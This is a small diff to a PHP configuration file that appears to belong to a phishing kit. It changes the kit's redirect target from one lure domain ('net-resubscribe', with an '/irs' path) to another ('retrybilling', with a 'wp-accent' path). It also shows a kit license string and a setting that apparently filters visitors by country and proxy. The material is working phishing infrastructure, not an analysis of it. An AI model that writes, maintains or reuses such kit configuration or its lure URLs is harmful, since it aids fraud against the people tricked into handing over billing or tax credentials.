@@ -57,7 +57,7 @@ if (isset($_GET["check"]))
 
 $license = "Houss-1987";
 
-$redirect = "https://net-resubscribe.serv00.net/irs";
+$redirect = "https://retrybilling.netsons.org/wp-accent/";
 
 $parameter = 4; // 1 => Both , 2 => Country , 3 => Proxy , 4 => Simple
 $wordpress = true; // Allow Wordpress Include
